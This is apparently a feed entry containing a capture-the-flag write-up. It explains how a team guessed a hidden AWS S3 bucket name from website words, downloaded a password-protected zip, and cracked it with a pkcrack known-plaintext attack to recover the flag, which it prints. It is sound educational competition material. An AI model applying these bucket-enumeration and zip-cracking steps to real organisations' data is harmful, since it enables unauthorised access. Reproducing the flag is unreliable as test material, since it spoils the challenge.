+&lt;p&gt;&lt;strong&gt;Flag:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;govtech-csg{EnCrYpT!0n_D0e$_NoT_M3@n_Y0u_aR3_s4f3}&lt;/code&gt;&lt;/p&gt;</content><author><name>MiloTruck</name></author><summary type="html">Category: Cloud Challenge Description It was made known to us that agents of COViD are exfiltrating data to a hidden S3 bucket in AWS! We do not know the bucket name! One tip from our experienced officers is that bucket naming often uses common words related to the company’s business. Do what you can! Find that hidden S3 bucket (in the format “word1-word2-s4fet3ch”) and find out what was exfiltrated! There doesn’t seem to be any obvious way to find out the leaking bucket. So we decided to brute force to find out. With only 2 words to guess, brute force doesn’t seem unreasonable. Visiting the company site, we are greeted with a word cloud. The most obvious solution was to use these words in the word cloud, however, we couldn’t find the bucket with that alone (if only it were that simple…) At this stage, we thought we needed to come up with our own words. To facilitate this I uploaded the script to our team EC2 instance which we set up in preparation for this ctf. There, we just kept adding words that we thought of including text from images on the website. With the new wordlist, we ran the script again. This allowed us to find the bucket: think-innovation-s4fet3ch While the script was running, we managed to confirm with admin that all words could be found on the website. But by then, we had already found the bucket. This is thanks to one of our team members deciding to add in words from the quote by Steve Jobs. Using aws cli, we can easily view the contents of the bucket with the command: aws s3 ls s3://think-innovation-s4fet3ch For which we get the following output 2020-11-17 23:59:54 273804 secret-files.zip Promising… Seems like we found the bucket. Again using aws-cli, we download the files with aws s3 cp s3://think-innovation-s4fet3ch/secret-files.zip ./ But our job is not done yet. When we try to unzip the files, we are prompted for a password (nani???). Immediately we thought of cracking the zip. With a few simple commands, we already got JTR brute forcing the zip. But after running it for a few second, we already sorta knew this wasn’t the solution. If JTR wasn’t able to insta-crack it with rockyou.txt, it’s quite safe to say the password is strong. However, we weren’t out of options just yet. While attempting to unzip, we also see that there are 2 files in the zip. ERROR: Wrong password : flag.txt ERROR: Wrong password : STACK the Flags Consent and Indemnity Form.docx Why is there an extra document there??? Looks like it was left there on purpose. It is a file that participants under 18 must fill up to join the CTF, we encountered it during registration, and we knew we could download a copy. So we know The zip contains 2 files with both encrypted The password is relatively resistant to brute force We have an unencrypted copy of one of the files Surely, this having access to one of the files must help right? And indeed it does. Knowing the plaintext of one of the files makes the zip vulnerable to a plaintext attack. We can use pkcrack to perform this attack. For this to happen, we also need to ensure that our plaintext is compressed in the same way as the encrypted zip. Initally, we tried to use Ubuntu default archive manager, and that didn’t work. Next we tried zipping it from the cmdline using: zip -r known.txt STACK\ the\ Flags\ Consent\ and\ Indemnity\ Form.docx Within a few seconds, pkcrack gives us an unencrypted zip file which contains our flag.txt. Flag: govtech-csg{EnCrYpT!0n_D0e$_NoT_M3@n_Y0u_aR3_s4f3}</summary></entry></feed>
